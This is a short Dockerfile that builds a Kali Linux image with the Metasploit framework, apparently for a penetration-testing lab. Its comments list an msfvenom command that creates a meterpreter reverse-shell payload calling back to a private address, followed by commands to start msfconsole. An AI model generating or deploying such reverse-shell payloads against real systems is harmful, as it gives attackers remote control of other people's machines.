FROM kalilinux/kali-rolling
RUN apt-get update && apt-get upgrade

RUN apt-get install -y metasploit-framework

## Commands to run after setup
# - msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=172.17.0.3LPORT=8888 -f elf > shell.elf
# - service postgresql start
# - msfconsole